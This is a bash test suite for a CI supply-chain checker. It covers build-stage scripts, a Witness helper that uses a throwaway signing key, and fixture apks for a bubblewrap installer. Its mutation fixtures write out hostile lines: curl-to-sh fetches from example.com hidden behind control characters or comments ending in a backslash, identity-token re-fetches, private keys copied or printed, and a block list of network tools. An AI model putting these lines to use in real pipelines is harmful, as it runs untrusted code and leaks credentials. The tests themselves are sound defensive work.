hm fsnapout "AC12 the record of a snapshot step is written under the release name (nothing marks it as a snapshot)" \
    '"witness-${step#snapshot-}/$step-collection.json"' \
       '"witness-${step#snapshot-}/${step#snapshot-}-collection.json"'
hm fsnapopen "AC12 the step list admits snapshot-evil (the snapshot names are a closed list)" 'in release-verify|' \
    'in snapshot-evil|release-verify|'
hm fkeep   "AC2 a comment ending in a backslash hides a copy of the token (bash runs the cp line)" \
   'unset ACTIONS_ID_TOKEN_REQUEST_TOKEN' '# token kept \\ncp /dev/null "$RUNNER_TEMP/tok"\nunset ACTIONS_ID_TOKEN_REQUEST_TOKEN'
{ cat "$work/witnessed.sh"; echo "witness run --step x -- true"; } > "$work/h_second.sh"
expect caught "AC2 a second witness invocation in the helper" "helper command" helper "$work/h_second.sh"
{ echo "# a different comment, which a human may add"; cat "$work/witnessed.sh"; } > "$work/h_comment.sh"
expect ok "AC2 comments in the helper are not commands" "" helper "$work/h_comment.sh"
printf 'set -euo pipefail\nwitness run --step apk -- timeout 540 bash bin/build-stage-apk.sh\n' > "$work/direct.sh"
expect caught "AC2 a stage script naming witness run directly" "witness run" directwitness "$work/direct.sh"
# ---- the local helper (owner Oct 22 2026, ops/docs/ratify/2026-10-22-witness-signed-outside-build.md, option 1): a BUILDING step records under Witness with a throwaway ed25519
# key made in the job and destroyed before it ends; no identity token, no Fulcio, no timestamp; Sign re-signs the payload keyless. Key hygiene is hygiene, not the trust boundary
# (the wrapped build runs on the same runner as the same user and can be assumed to see anything the job can): the guarantee is Sign's digest check plus verifiers refusing a record
# whose only signature is the throwaway one. Tests written first.
python3 - "$shape" "$work/witnessed-local.sh" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
open(sys.argv[2], "w").write("#!/usr/bin/env bash\n" + "\n".join(S.local_lines()) + "\n")
PY
expect ok "WIT1 fixture: the known-good bin/witnessed-local.sh is exactly the canonical local helper" "" localhelper "$work/witnessed-local.sh"
expect ok "WIT1 the real bin/witnessed-local.sh is exactly the canonical local helper" "" localhelper "$root/bin/witnessed-local.sh"
lm() { replace "$work/witnessed-local.sh" "$work/l_$1.sh" "$3" "$4" && expect caught "$2" "local helper" localhelper "$work/l_$1.sh"; return 0; }
lm lfulcio  "WIT1 a Fulcio flag (Build must not ask for a certificate)" '--signer-file-key-path' '--signer-fulcio-url https://fulcio.sigstore.dev --signer-file-key-path'
lm ltsa     "WIT1 a timestamp authority flag" '--env-filter-sensitive-vars' '-t https://timestamp.sigstore.dev/api/v1/timestamp --env-filter-sensitive-vars'
lm ltoken   "WIT1 the identity token fetched again" 'mkdir -p "witness-${step#snapshot-}"' 'mkdir -p "witness-${step#snapshot-}"\ntok=$(sh bin/loopback-get.sh -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" | jq -r .value)'
lm lfixed   "WIT1 the key at a fixed path" '"$kd/key.pem"' '/tmp/key.pem'
lm lnotemp  "WIT1 the key directory outside the runner temp folder" '"${RUNNER_TEMP:?}/witness-key.XXXXXX"' '/tmp/witness-key.XXXXXX'
lm lrsa     "WIT1 another key algorithm" 'genpkey -algorithm ed25519' 'genpkey -algorithm RSA'
lm lnotrap  "WIT1 no trap (a signal would leave the key)" "trap 'rm -rf \"\$kd\"' EXIT HUP INT TERM\n" ''
lm ltrapx   "WIT1 the trap covers only the normal exit" "EXIT HUP INT TERM" "EXIT"
lm lnorm    "WIT1 the key not removed after the run" 'rm -rf "$kd"\n[ ! -e' '[ ! -e'
lm lnocheck "WIT1 no check that the key directory is gone" '[ ! -e "$kd" ] || { echo "witnessed-local: the throwaway key directory still exists" >&2; exit 1; }\n' ''
lm lignore  "WIT1 a failure of the witnessed command ignored" '|| rc=$?' '|| true'
lm lexec    "WIT1 witness exec'd (the shell, and with it the cleanup, would be replaced)" 'witness run --step' 'exec witness run --step'
lm lumask   "WIT1 a looser umask (the key file would be readable by others)" 'umask 077' 'umask 022'
lm lcopy    "WIT1 the key copied into the record directory (it would be uploaded)" 'rc=0' 'rc=0\ncp "$kd/key.pem" "witness-${step#snapshot-}/key.pem"'
lm lcat     "WIT1 the key printed" 'rc=0' 'rc=0\ncat "$kd/key.pem"'
lm lsigned  "WIT1 the record written under the signed name (it must end in .local.json: only Sign signs a trusted one)" '$step-collection.local.json' '$step-collection.json'
lm lopen    "WIT1 the step list open" 'apk|build|rapk|rebuild|snapshot-apk' '*|apk'
lm lrelease "WIT1 a Release step in the list (Release keeps the keyless helper)" 'snapshot-rebuild|scanners' 'snapshot-rebuild|release-sign|scanners'
lm lslsa    "WIT1 the slsa attestor" 'environment,git,material,product' 'environment,git,material,slsa'
lm lgha     "WIT1 the github attestor (it embeds the raw OIDC token)" 'environment,git,material,product' 'environment,git,github,material,product'
lm lnoflt   "WIT1 no environment filter" '--env-filter-sensitive-vars' ''
lm lnounset "WIT1 the token variables not unset" 'unset ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL SIGSTORE_ID_TOKEN\n' ''
lm ltimeout "WIT1 no time limit on the build" '-- timeout -k 20 540 bash' '-- bash'
lm lsnapdir "WIT1 a snapshot record in its own directory (the uploads would miss it)" 'mkdir -p "witness-${step#snapshot-}"' 'mkdir -p "witness-$step"'
{ cat "$work/witnessed-local.sh"; echo "witness run --step x -- true"; } > "$work/l_second.sh"
expect caught "WIT1 a second witness invocation in the local helper" "local helper" localhelper "$work/l_second.sh"
# ---- behaviour of the real local helper against a stub witness (no network, no identity token) -----------------------------------------------
wl="$work/wl"; mkdir -p "${wl:?}/bin" "${wl:?}/stub" "${wl:?}/keep"
cp "$root/bin/witnessed-local.sh" "$wl/bin/witnessed-local.sh" 2>/dev/null || : > "$wl/bin/witnessed-local.sh"
cat > "$wl/stub/witness" <<'STUB'
#!/usr/bin/env bash
# a stand-in for Witness: records its arguments, checks the key it was handed, writes a record at the -o path
printf '%s\n' "$@" > "$STUB_KEEP/argv"
key=""; out=""; prev=""
for a in "$@"; do
  [ "$prev" = --signer-file-key-path ] && key=$a
  [ "$prev" = -o ] && out=$a
  prev=$a
done
[ -f "$key" ] || { echo "stub: no key file" >&2; exit 41; }
{ stat -c '%a' "$key" 2>/dev/null || stat -f '%Lp' "$key"; } > "$STUB_KEEP/keymode" 2>/dev/null
{ stat -c '%a' "$(dirname "$key")" 2>/dev/null || stat -f '%Lp' "$(dirname "$key")"; } > "$STUB_KEEP/dirmode" 2>/dev/null
cp "$key" "$STUB_KEEP/keycopy"; echo "$key" > "$STUB_KEEP/keypath"; env | grep -E '^(ACTIONS_|SIGSTORE_)' > "$STUB_KEEP/envtokens" || true
case "${STUB_MODE:-ok}" in
  fail) exit 3 ;;
  sleep) echo $$ > "$STUB_KEEP/stubpid"; echo $PPID > "$STUB_KEEP/helperpid"; trap 'exit 143' TERM; : > "$STUB_KEEP/started"; sleep 30 & wait; exit 0 ;;
esac
mkdir -p "$(dirname "$out")"; printf '{"stub":"record"}\n' > "$out"
STUB
chmod +x "$wl/stub/witness"
wclean() { find "${wl:?}/tmp" "${wl:?}/keep" -mindepth 1 -delete 2>/dev/null || true; rm -rf "${wl:?}/witness-apk" "${wl:?}/witness-rebuild"; mkdir -p "${wl:?}/tmp" "${wl:?}/keep"; }
wrun() { # wrun STEP MODE  -> sets wl_rc; the helper runs in $wl with a clean runner temp folder
  wclean; wl_rc=0
  ( cd "$wl" && env -i PATH="$wl/stub:$PATH" HOME="$wl" RUNNER_TEMP="$wl/tmp" STUB_KEEP="$wl/keep" STUB_MODE="$2" \
      ACTIONS_ID_TOKEN_REQUEST_TOKEN=leak-token ACTIONS_ID_TOKEN_REQUEST_URL=https://example.invalid/t SIGSTORE_ID_TOKEN=leak-sig \
      bash bin/witnessed-local.sh "$1" true > "$wl/out.log" 2>&1 ) || wl_rc=$?; }
wrun apk ok
if [ "$wl_rc" = 0 ] && [ -f "$wl/witness-apk/apk-collection.local.json" ] && [ ! -e "$wl/witness-apk/apk-collection.json" ]; then ok "WIT2 a building step writes its record as <step>-collection.local.json and never the signed name"; else bad "WIT2 the record is not at witness-apk/apk-collection.local.json (rc=$wl_rc): $(ls "$wl" | tr '\n' ' ')"; fi
if [ "$wl_rc" = 0 ] && [ -z "$(ls -A "$wl/tmp")" ]; then ok "WIT2 the key directory is gone after a successful run (runner temp folder empty)"; else bad "WIT2 the runner temp folder still holds: $(ls -A "$wl/tmp" | tr '\n' ' ')"; fi
if [ "$(cat "$wl/keep/keymode" 2>/dev/null)" = 600 ] && [ "$(cat "$wl/keep/dirmode" 2>/dev/null)" = 700 ]; then ok "WIT2 the key file was 0600 in a 0700 directory while Witness ran (hygiene)"; else bad "WIT2 key modes: file $(cat "$wl/keep/keymode" 2>/dev/null) dir $(cat "$wl/keep/dirmode" 2>/dev/null)"; fi
if grep -q 'BEGIN PRIVATE KEY' "$wl/keep/keycopy" 2>/dev/null; then ok "WIT2 the key handed to Witness is a PEM private key made in the job"; else bad "WIT2 no PEM key reached Witness"; fi
if ! grep -qE -- '--signer-fulcio|^-t$|timestamp|audience' "$wl/keep/argv" && grep -qx -- '--signer-file-key-path' "$wl/keep/argv"; then ok "WIT2 Witness gets a file key and no Fulcio, timestamp or token flag"; else bad "WIT2 unexpected Witness arguments: $(tr '\n' ' ' < "$wl/keep/argv")"; fi
if [ -f "$wl/keep/envtokens" ] && [ ! -s "$wl/keep/envtokens" ]; then ok "WIT2 the identity-token variables are not in the environment Witness (and so the build) sees"; else bad "WIT2 the wrapped environment still holds: $(cat "$wl/keep/envtokens" 2>/dev/null)"; fi
kb=$(grep -v -- '-----' "$wl/keep/keycopy" 2>/dev/null | tr -d '\n') || kb=""
if [ -n "$kb" ] && ! grep -rqF -- "$kb" "$wl/witness-apk" "$wl/out.log"; then ok "WIT2 the key bytes appear in no record, no upload directory and no log"; else bad "WIT2 the key bytes are in a record, an upload directory or the log (or no key was made)"; fi
wrun apk fail
if [ "$wl_rc" = 3 ] && [ -z "$(ls -A "$wl/tmp")" ]; then ok "WIT2 a failing Witness run keeps its exit status (3) and the key is still destroyed"; else bad "WIT2 failure case: rc=$wl_rc, temp: $(ls -A "$wl/tmp" | tr '\n' ' ')"; fi
wrun release-sign ok
if [ "$wl_rc" = 2 ] && [ ! -e "$wl/keep/argv" ]; then ok "WIT2 a non-building step (release-sign) is refused with exit 2 before anything runs"; else bad "WIT2 release-sign was not refused (rc=$wl_rc)"; fi
wrun snapshot-rebuild ok
if [ "$wl_rc" = 0 ] && [ -f "$wl/witness-rebuild/snapshot-rebuild-collection.local.json" ]; then ok "WIT2 a snapshot step records under its release directory with the snapshot- name inside the file name"; else bad "WIT2 snapshot-rebuild record missing (rc=$wl_rc): $(ls "$wl" | tr '\n' ' ')"; fi
# a TERM signal while Witness runs: the trap destroys the key directory
wclean
( cd "$wl" && env -i PATH="$wl/stub:$PATH" HOME="$wl" RUNNER_TEMP="$wl/tmp" STUB_KEEP="$wl/keep" STUB_MODE=sleep bash bin/witnessed-local.sh apk true > "$wl/sig.log" 2>&1 ) &
wl_pid=$!; for _ in $(seq 40); do [ -e "$wl/keep/started" ] && break; sleep 0.25; done
if [ -s "$wl/keep/helperpid" ]; then kill -TERM "$(cat "$wl/keep/helperpid")" 2>/dev/null || true; fi
if [ -s "$wl/keep/stubpid" ]; then kill -TERM "$(cat "$wl/keep/stubpid")" 2>/dev/null || true; fi
for _ in $(seq 40); do { [ -s "$wl/keep/helperpid" ] && kill -0 "$(cat "$wl/keep/helperpid")" 2>/dev/null; } || break; sleep 0.25; done
wait "$wl_pid" 2>/dev/null || true
if [ -e "$wl/keep/started" ] && [ -z "$(ls -A "$wl/tmp")" ]; then ok "WIT2 a TERM signal while Witness runs still destroys the key directory (trap)"; else bad "WIT2 after TERM the runner temp folder holds: $(ls -A "$wl/tmp" | tr '\n' ' ')"; fi
# ---- the four stage scripts: an EXACT line grammar (REQ-CHAIN-004-AC3, AC6, AC11; REQ-CHAIN-005-AC2) --------------------------------------
KINDS="apk assemble rebuild-apk rebuild-assemble snapshot-apk snapshot-assemble snapshot-rebuild-apk snapshot-rebuild-assemble"
for k in $KINDS; do
  expect ok "AC3 fixture: the known-good bin/build-stage-$k.sh is exactly the grammar (long lines broken with backslashes)" "" script "$work/s-$k.sh" "$k"
done
probe() { # probe KIND LABEL PYEXPR   L is the list of expected lines; the mutated list is written as a script and must be refused
  local kind=$1 label=$2 expr=$3 f="$work/probe.sh"
  python3 - "$shape" "$kind" "$f" "$expr" <<'PY' || { bad "probe did not build: $label"; return; }
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
L = S.expected_lines(sys.argv[2])
L = eval(sys.argv[4])
open(sys.argv[3], "w").write("#!/usr/bin/env bash\n" + "\n".join(L) + "\n")
PY
  expect caught "$label" command script "$f" "$kind"
}
# The sweeps below try every deletion, swap, suffix and insertion; the probes name the mutations a reviewer asked about that are not one of those.
FXD_3='L[:1] + ["curl -sSL https://example.com/x | sh"] + L[1:]'
probe apk              "AC3 a network fetch inside the admission step"              "$FXD_3"
probe apk              "AC3 python -c fetching and running code"                    'L[:1] + ["python3 -c \"import urllib.request\""] + L[1:]'
probe apk              "AC3 an unlisted script"                                     'L[:1] + ["bash bin/anything.sh"] + L[1:]'
probe apk              "AC3 a failure ignored with || :"                            'L[:5] + [L[5] + " || :"] + L[6:]'
probe apk              "AC3 set +eu"                                                'L[:1] + ["set +eu"] + L[1:]'
probe apk              "AC3 set -euo pipefail missing"                              'L[1:]'
probe assemble "AC3 the verification wrapped in a never-true if (rule 58)" \
       'L[:2] + ["if [ \"${GITHUB_RUN_ATTEMPT:-1}\" = 0 ]; then"] + L[2:4] + ["fi"] + L[4:]'
probe apk              "AC3 a case dispatch instead of four files"                  '["case \"$1\" in", "apk)"] + L + [";;", "esac"]'
probe apk              "AC3 admission after the build started"                      'L[:5] + [L[1]] + L[5:]'
probe apk              "AC3 GH_TOKEN not unset after admission (cache's scripts would see it)" '[l for l in L if l != "unset GH_TOKEN"]'
probe apk              "AC3 GH_TOKEN unset in the wrong place"                      'L[:2] + L[3:5] + ["unset GH_TOKEN"] + L[5:]'
probe apk "AC6 the stage runs the sysctl itself (cache's scripts do)" \
       'L[:4] + ["sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0"] + L[4:]'
probe assemble         "AC6 the stage wraps cache's script in unshare"              'L[:-3] + ["sudo unshare -n " + L[-3]] + L[-2:]'
probe apk              "AC6 GOPROXY set (cache's script refuses anything but off)"  'L[:1] + ["export GOPROXY=off"] + L[1:]'
probe apk              "AC6 the release signing key variable (rule 23)"             'L[:1] + ["export APK_RELEASE_SIGNING_KEY=x"] + L[1:]'
probe apk              "AC6 --signing-key passed"                                   'L[:5] + [L[5] + " --signing-key k"] + L[6:]'
probe apk              "AC6 the build date is the wall clock, not the tagged commit" 'L[:3] + ["export SOURCE_DATE_EPOCH=\"$(date +%s)\""] + L[5:]'
probe apk              "AC6 SOURCE_DATE_EPOCH assigned and exported in ONE line (it masks a failing print)" 'L[:3] + ["export " + L[3]] + L[5:]'
probe assemble "AC6 a later SOURCE_DATE_EPOCH override on an image build" \
       '[("SOURCE_DATE_EPOCH=1 " + l if "assemble-image.sh --variant fips" in l else l) for l in L]'
probe assemble "AC11 a direct apko call" \
       'L[:-3] + ["apko build --lockfile out/production.lock.json build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe assemble "AC11 apko build without the lock (a different image digest per the real run)" \
       'L[:-3] + ["apko build build/apko.yaml fscache:x out/production.tar"] + L[-3:]'
probe assemble "AC11 --lockfile passed by the stage" \
       '[l + " --lockfile out/production.lock.json" if "assemble-image.sh --variant production" in l else l for l in L]'
probe assemble         "AC11 a cd away from the repo root"                          'L[:1] + ["cd build"] + L[1:]'
probe assemble         "AC11 --archive pointing at another directory than the archive" '[l.replace("--archive archive", "--archive /tmp/other") for l in L]'
probe assemble "AC11 --melange-repo pointing at an unverified download" \
       '[l.replace("--melange-repo melange-repo", "--melange-repo apk/ubuntu-24.04") for l in L]'
probe apk              "AC6 a source dir other than the checkout (another commit)"  '[l.replace("--source-dir . ", "--source-dir /tmp/other ") for l in L]'
probe apk "AC3 the version check on a directory other than the built one" '[l.replace("--apk-dir \"out/$(uname -m)\"", "--apk-dir /bin") for l in L]'
probe apk              "AC3 the version check missing for the fips apk (rule 24 covers both)" '[l for l in L if "--variant fips --tag" not in l]'
probe assemble         "AC3 one apk directory not bound (a bind line missing)"      '[l for i, l in enumerate(L) if i != 1]'
probe assemble         "AC3 the files not bound to the record (the bind lines missing)" '[l for l in L if "chain-verify.py bind" not in l]'
probe assemble         "AC3 bound with the Rebuild step name (a Rebuild record can stand in)" '[l.replace("bind --local --step apk", "bind --local --step rapk") for l in L]'
probe assemble         "AC3 the admission baseline written BEFORE the files are bound" 'L[:1] + L[3:4] + L[1:3] + L[4:]'
probe assemble "AC3 bound as a signed record (the building job's record is local and unsigned)" '[l.replace("bind --local ", "bind ") for l in L]'
probe assemble "AC3 bound to a record named like a signed one" '[l.replace("apk-collection.local.json", "apk-collection.json") for l in L]'
probe assemble         "AC9 digests.json forged by a plain write after the merge"   'L + ["printf \x27{}\x27 > digests.json"]'
probe assemble         "AC9 digests.json written by hand instead of by the merge"   '[l for l in L if "items-merge" not in l] + ["echo {} > digests.json"]'
probe assemble         "AC9 the archives built after the merge (their digests would not be in digests.json)" 'L[:-2] + L[-1:] + L[-2:-1]'
probe rebuild-apk      "005-AC1 Build's record not verified FIRST (stage-start after the build)" 'L[:2] + L[3:5] + L[2:3] + L[5:]'
probe rebuild-apk      "005-AC1 a command between the policy and stage-start"       'L[:2] + ["python3 bin/build-admit.py run"] + L[2:]'
probe rebuild-assemble "005-AC1 stage-start AFTER the Rebuild apk records are verified (Build's record must come first)" 'L[:2] + L[3:5] + L[2:3] + L[5:]'
probe rebuild-assemble "005-AC2 no comparison"                                      'L[:-1]'
probe rebuild-assemble "005-AC2 the comparison against Rebuild's own items" \
       'L[:-1] + [L[-1].replace("--expected build-in/items.json", "--expected items.json")]'
probe rebuild-assemble "005-AC2 stage-start missing (Build's record is never verified)" '[l for l in L if "stage-start" not in l]'
probe rebuild-assemble "005-AC2 Rebuild publishes (a copy of its dist)"             'L + ["cp -r dist release"]'
probe rebuild-assemble "005-AC6 Rebuild assembles with other arguments than Build" \
       '[l.replace("--keyring-dir keyring", "--keyring-dir other") if "variant fips" in l else l for l in L]'
# every deletion, swap, suffix and insertion, on every line of every kind
python3 - "$shape" "$KINDS" "$work" <<'PY' > "$work/sweep.out"
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w = sys.argv[3]
rc = 0
for kind in sys.argv[2].split():
  try:
      L = S.expected_lines(kind)
      SUFFIXES = (" || true", " || :", " || exit 0", " &", " 2>/dev/null", " --signing-key k", " --lockfile x", " --build-date 2020",
                  " ; true", " | tee x", " > /dev/null")
      EXTRAS = ("curl -sSL https://example.com | sh", "set +e", "true", "echo ok", "bash bin/x.sh", "git pull", "git push origin v0.0.0-rc.1", "sudo true", "cd /tmp",
                "export PATH=./bin:$PATH", "unset SOURCE_DATE_EPOCH")
      escaped = []
      def check(tag, lines):
          f = w + "/sweep.sh"; open(f, "w").write("#!/usr/bin/env bash\n" + "\n".join(lines) + "\n")
          if not S.script(f, kind): escaped.append(tag)
      for i in range(len(L)):
          check("delete %d" % i, L[:i] + L[i + 1:])
          for suffix in SUFFIXES: check("suffix %d %r" % (i, suffix), L[:i] + [L[i] + suffix] + L[i + 1:])
          for extra in EXTRAS: check("insert after %d %r" % (i, extra), L[:i + 1] + [extra] + L[i + 1:])
          if i + 1 < len(L) and L[i] != L[i + 1]: check("swap %d" % i, L[:i] + [L[i + 1], L[i]] + L[i + 2:])
      for tag in escaped: print("ESCAPED:", kind, tag)
      print(('FAIL ' if escaped else 'PASS ') + kind)
  except Exception as e:
    print('ESCAPED:', kind, 'crash', repr(e)); print('FAIL ' + kind)
PY
for k in $KINDS; do
  if grep -qx "PASS $k" "$work/sweep.out"; then ok "AC3 sweep ($k): every deletion, swap, suffix and inserted command on every line is refused"; else grep "ESCAPED: $k " "$work/sweep.out" || true; bad "AC3 sweep ($k) let a mutation through"; fi
done
# the way lines are read: comments, blank lines and trailing-backslash breaks are fine; an indented command is not; and bash and Python disagree about
# VT, FF, FS, NEL and U+2028 (Python splits lines or strips space there, bash does not), so any control character other than tab and newline is refused
python3 - "$shape" "$work" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w, L = sys.argv[2], S.expected_lines("apk")
def put(name, text): open("%s/%s.sh" % (w, name), "w").write(text)
put("c-ok", "#!/usr/bin/env bash\n# a comment\n\n" + "\n".join(L[:2]) + "\n# another\n" + "\n".join(L[2:]) + "\n")
put("c-indent", "#!/usr/bin/env bash\n" + "\n".join(L[:2]) + "\n  " + L[2] + "\n" + "\n".join(L[3:]) + "\n")
for name, ch in (("vt", "\x0b"), ("ff", "\x0c"), ("fs", "\x1c"), ("nel", "\x85"), ("ls", "\u2028")):
    put("c-" + name + "-hide", "#!/usr/bin/env bash\n" + L[0] + ch + "curl -s https://example.com | sh\n" + "\n".join(L[1:]) + "\n")      # one line for bash
    put("c-" + name + "-comment", "#!/usr/bin/env bash\n# a note" + ch + "curl -s https://example.com | sh\n" + "\n".join(L) + "\n")        # a comment for bash
PY
python3 - "$shape" "$work" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("shape", sys.argv[1]); S = importlib.util.module_from_spec(spec); spec.loader.exec_module(S)
w, L = sys.argv[2], S.expected_lines("apk")
def put(name, text): open("%s/%s.sh" % (w, name), "wb").write(("#!/usr/bin/env bash\n" + text).encode())
body = "\n".join(L) + "\n"
put("c-cr-glued", L[0] + "\n" + L[1] + "\r" + L[2] + "\n" + "\n".join(L[3:]) + "\n")       # one line for bash, two for Python
put("c-crlf", body.replace("\n", "\r\n"))
put("c-comment-backslash", L[0] + "\n# a note \\\ncurl -s https://example.com | sh\n" + "\n".join(L[1:]) + "\n")                   # bash runs the curl line
put("c-token-saved", "\n".join(L[:2]) + '\n# keep the token for later \\\nexport GHT="$GH_TOKEN"\n' + "\n".join(L[2:]) + "\n")
put("c-bare-backslash", "\n".join(L[:3]) + "\n" + L[3] + "\\\n" + "\n".join(L[4:]) + "\n")                                         # joins with no space
put("c-open-continuation", body + L[-1] + " \\\n")
PY
expect ok     "AC3 comments and blank lines are not commands" "" script "$work/c-ok.sh" apk
expect caught "AC3 a lone CR glued between two grammar lines (Python reads two lines, bash one)" "control character U+000D" script "$work/c-cr-glued.sh" apk
expect caught "AC3 a CRLF script" "control character U+000D" script "$work/c-crlf.sh" apk
FXD_2="AC3 a comment ending in a backslash does not hide the curl line after it (bash runs that line)"
expect caught "$FXD_2" command script "$work/c-comment-backslash.sh" apk
expect caught "AC3 a comment ending in a backslash does not hide an export of the token before it is unset" command script "$work/c-token-saved.sh" apk
expect caught "AC3 a backslash at the end of a line with no space before it" "not preceded by a space" script "$work/c-bare-backslash.sh" apk
expect caught "AC3 a script that ends in a line continuation" "ends in a line continuation" script "$work/c-open-continuation.sh" apk
expect caught "AC3 an indented command is not the grammar line" command script "$work/c-indent.sh" apk
for name in vt ff fs nel ls; do
  expect caught "AC3 control character ($name) joined to a grammar line" "control character" script "$work/c-$name-hide.sh" apk
  expect caught "AC3 control character ($name) hidden in a comment" "control character" script "$work/c-$name-comment.sh" apk
done
# ---- Build and Rebuild assemble identically (REQ-CHAIN-004-AC11, REQ-CHAIN-005-AC6) -----------------------------------------------------------
LA="$work/s-assemble.sh"; LR="$work/s-rebuild-assemble.sh"
expect ok "AC11/005-AC6 fixture: Build and Rebuild assemble with the same script and arguments; no stage file names apko" "" lockflow "$LA" "$LR" \
       "$work/build.yml" "$work/rebuild.yml"
replace "$LR" "$work/lf_date.sh" 'assemble-image.sh --variant production' 'assemble-image.sh --build-date 2026-10-09T00:00:00Z --variant production' \
       && expect caught "005-AC6 Rebuild passes its own --build-date" "not identical" lockflow "$LA" "$work/lf_date.sh"
replace "$LR" "$work/lf_ver.sh" '--variant production --version "${GITHUB_REF_NAME#v}"' '--variant production --version "9.9.9"' && expect caught \
       "005-AC6 Rebuild's version differs from Build's" "not identical" lockflow "$LA" "$work/lf_ver.sh"
replace "$work/build.yml" "$work/lf_apko.yml" 'run: bash bin/witnessed-local.sh build bin/build-stage-assemble.sh' \
       'run: bash bin/witnessed-local.sh build bin/build-stage-assemble.sh && apko build build/apko.yaml fscache:x out.tar' && expect caught \
       "AC11 a stage workflow names apko in a run step" apko lockflow "$LA" "$LR" "$work/lf_apko.yml"
replace "$work/build.yml" "$work/lf_apkoi.yml" 'run: bash bin/install-build-tools.sh apko' 'run: bash bin/install-build-tools.sh apko --version 9' && expect caught \
       "AC11 the apko installer line with an extra argument is not the one admitted line" apko lockflow "$LA" "$LR" "$work/lf_apkoi.yml"
replace "$work/build.yml" "$work/lf_apkoj.yml" 'run: bash bin/install-build-tools.sh apko' 'run: bash bin/install-build-tools.sh apko && apko build build/apko.yaml fscache:x out.tar' && expect caught \
       "AC11 apko run in the installer step's own command line is refused" apko lockflow "$LA" "$LR" "$work/lf_apkoj.yml"
# ---- the scripts are listed with their sha256 (PR 1's chain-scripts.json design) --------------------------------------------------------------
mkdir -p "$work/listed/bin"
for k in $KINDS
do cp "$work/s-$k.sh" "$work/listed/bin/build-stage-$k.sh"
done
cp "$work/witnessed.sh" "$work/listed/bin/witnessed.sh"
expect ok "AC3 fixture: the five scripts (four stage scripts and bin/witnessed.sh) are rows of chain-scripts.json with the committed bytes' sha256" "" \
       listed "$work/chain-scripts.json" "$work/listed"
echo '# changed after listing' >> "$work/listed/bin/build-stage-apk.sh"
expect caught "AC3 a script changed after it was listed is refused (the sha256 binding)" "sha256" listed "$work/chain-scripts.json" "$work/listed"
python3 - "$work/chain-scripts.json" "$work/chain-scripts-short.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
d["scripts"] = d["scripts"][1:]
json.dump(d, open(sys.argv[2], "w"))
PY
expect caught "AC3 a script that is not a row of chain-scripts.json is refused" "not a row" listed "$work/chain-scripts-short.json" "$work/listed"
# REQ-CHAIN-004-AC17 (advisor reading Oct 20, handoff 0524; rules 15 and 38a): the host tools (bubblewrap and what it needs) come out of the archive, never a package manager.
# bin/install-host-bwrap.py is run against FIXTURE apks built here (a gzip control segment with .PKGINFO and a gzip data segment, the datahash being the sha256 of the data segment
# as in Wolfi's packages), a lock and an archive directory; every refusal leaves NOTHING written (no host-tools directory, no wrapper).
NOWORDS='curl|wget|apt-get|apk add|sudo|pip install|urllib|socket|http.client|requests|subprocess|os.system|shutil.which|dpkg|yum|dnf'
python3 -I - "$root" "$work" "$NOWORDS" > "$work/ac17.out" <<'PY'
import gzip, hashlib, io, os, shutil, subprocess, sys, tarfile
root, work = sys.argv[1:3]
script = root + "/bin/install-host-bwrap.py"
base = work + "/hb"
shutil.rmtree(base, ignore_errors=True); os.makedirs(base)
ARCH = "x86_64"


def tar_bytes(entries):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=tarfile.GNU_FORMAT) as t:
        for name, kind, data, extra in entries:
            ti = tarfile.TarInfo(name)
            if kind == "file":
                ti.size = len(data); ti.mode = extra or 0o644; t.addfile(ti, io.BytesIO(data))
            elif kind == "dir":
                ti.type = tarfile.DIRTYPE; ti.mode = 0o755; t.addfile(ti)
            elif kind == "sym":
                ti.type = tarfile.SYMTYPE; ti.linkname = data; t.addfile(ti)
            elif kind == "hard":
                ti.type = tarfile.LNKTYPE; ti.linkname = data; t.addfile(ti)
            elif kind == "dev":
                ti.type = tarfile.CHRTYPE; ti.devmajor = 1; ti.devminor = 3; t.addfile(ti)
    return buf.getvalue()


def gz(b):
    return gzip.compress(b, mtime=0)


def apk(path, name, ver, files, arch=ARCH, datahash=None, pkgname=None, pkgver=None, sig=False):
    data = gz(tar_bytes(files))
    dh = hashlib.sha256(data).hexdigest() if datahash is None else datahash
    info = "pkgname = %s\npkgver = %s\narch = %s\ndatahash = %s\n" % (pkgname or name, pkgver or ver, arch, dh)
    ctl = gz(tar_bytes([(".PKGINFO", "file", info.encode(), None)]))
    sg = gz(tar_bytes([(".SIGN.RSA.x.rsa.pub", "file", b"sig", None)])) if sig else b""
    os.makedirs(os.path.dirname(path), exist_ok=True)
    open(path, "wb").write(sg + ctl + data)


LOADER = b"#!/bin/sh\necho \"LOADER $@\"\n"


def good_set(arch_dir, **kw):
    a = arch_dir
    apk(a + "/bubblewrap-0.13.0-r0.apk", "bubblewrap", "0.13.0-r0", [("usr", "dir", None, None), ("usr/bin", "dir", None, None), ("usr/bin/bwrap", "file", b"BWRAP", 0o755)], **kw)
    apk(a + "/libcap-2.78-r4.apk", "libcap", "2.78-r4", [("usr/lib/libcap.so.2.78", "file", b"CAP", None), ("usr/lib/libcap.so.2", "sym", "libcap.so.2.78", None)], **kw)
    apk(a + "/glibc-2.43-r13.apk", "glibc", "2.43-r13", [("usr/lib/libc.so.6", "file", b"LIBC", None), ("usr/bin/ld.so", "sym", "../../lib64/ld-linux-x86-64.so.2", None)], **kw)
    apk(a + "/ld-linux-2.43-r13.apk", "ld-linux", "2.43-r13", [("usr/lib/ld-linux-x86-64.so.2", "file", LOADER, 0o755)], **kw)


